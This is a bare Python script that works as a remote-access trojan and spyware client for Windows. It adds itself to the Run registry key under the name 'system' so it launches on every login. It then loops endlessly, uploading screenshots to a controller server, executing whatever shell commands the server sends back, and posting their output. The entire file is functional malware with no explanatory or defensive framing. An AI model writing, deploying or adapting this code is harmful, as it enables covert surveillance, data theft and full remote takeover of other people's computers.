CODE = "jjlxx001"

import requests
import pyautogui
import sys
import subprocess
import time
import win32api
import win32con
import win32gui
import os

a = sys.argv[0]
url = 'http://127.0.0.1:5000/'
b = a.split('.')[0] + ".jpg"
key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0,
                          win32con.KEY_WRITE)
win32api.RegSetValueEx(key, "system", 0, win32con.REG_SZ, a)
while 1:
    try:
        im2 = pyautogui.screenshot(b)
        files = {'file': open(b, 'rb')}
        data = {'code': CODE, "key": "1"}
        response = requests.post(url, files=files, data=data)
        if response.text != "nothing":
            data = {'data': os.popen(response.text).readlines(), "key": "0"}
            response = requests.post(url + "finish", data=data)
            print(response.text)
    except:
        time.sleep(0.1)
        continue
